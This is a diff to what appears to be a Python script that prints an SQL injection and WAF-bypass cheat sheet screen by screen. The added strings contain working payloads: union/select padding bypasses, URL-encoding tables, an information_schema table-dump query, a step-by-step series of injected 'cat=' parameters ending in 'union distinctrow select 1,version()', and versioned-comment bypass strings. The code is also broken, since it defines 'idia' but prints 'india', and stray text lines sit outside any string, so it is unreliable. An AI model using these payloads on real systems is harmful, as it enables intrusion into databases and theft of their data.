@@ -566,11 +566,16 @@ input("[Pres Enter]")
 
 
 charle="""
+ --------------------------------------------------------------------------------------------
+ Forbidden On Union & Select # buffer over flow # union and select blocked
+ --------------------------------------------------------------------------------------------
 %23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0a
 --------------------------------------------------------------------------------------------
 %23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a
 --------------------------------------------------------------------------------------------
-
+union23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaselect
+--------------------------------------------------------------------------------------------
+union%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0a%23aaaaaaaaaaaaaaaaaaaaaa%0aselect
 """
 
 clear()
@@ -578,6 +583,93 @@ print(charle)
 input("[Pres Enter]")
 
 
+
+
+
+delta="""
+ Not Found Error Bypassing becouse hex encryptions #use this way when you use encryptions or pattrens like dot or $
+--------------------------------------------------------------------------------------------
+group_concat(tAblE_name)   from information_Schema.tables Where+table_ScHEmA=schEMA()-- -
+--------------------------------------------------------------------------------------------
+https://pastebin.com/raw/gp1Brynr
+--------------------------------------------------------------------------------------------
+.=252E
+--------------------------------------------------------------------------------------------
+space%20
+--------------------------------------------------------------------------------------------
+"    %22
+#    %23
+%    %25
+&    %26
+'    %27
+(    %28
+)    %29
+*    %2A
++    %2B
+,    %2C
+.    %2E
+/    %2F
+0    %30
+=    %3D
+"""
+
+clear()
+print(delta)
+input("[Pres Enter]")
+
+
+
+idia="""
+Contradictory errors
+--------------------------------------------------------------------------------------------
+cat=7' is null
+--------------------------------------------------------------------------------------------
+select column1,column2 from table where condition=value order by column1 desc|asc limit 0,1  
+--------------------------------------------------------------------------------------------
+cat=43&id=230
+------------------------------------
+cat=43' order by 3 asc -- -&id=230
+------------------------------------
+cat=43' union a-- -&id=230
+------------------------------------
+cat=43' is null union a-- -&id=230
+------------------------------------
+cat=43' and 0 union a-- -&id=230
+------------------------------------
+cat=43' and 0 union/**/distinctrow select-- -&id=230
+------------------------------------
+cat=43' and 0 union/**/distinctrow select 1,2-- -&id=230
+------------------------------------
+cat=43' and 0 union/**/distinctrow select 1,version()-- -&id=230
+------------------------------------
+cat=43' and 0 union/**/distinctrow select 1,version()-- -&id=230
+------------------------------------
+cat=43' and 0 union/**/distinctrow Select 1,version()-- -&id=230
+
+
+.4/*!32302union*/ /**/select/**/version(),2 -- -
+.4/*!32302union*/distinctrow /**/select/**/version(),2 -- -
+.4 and null /*!32302union*/distinctrow /**/select/**/version(),2 -- -
+
+
+"""
+
+
+
+
+clear()
+print(india)
+input("[Pres Enter]")
+
+
+
+
+403 Forbidden 
+
+
+
+
+brute forcing columns in SQL By Check Every Column
 
 
 
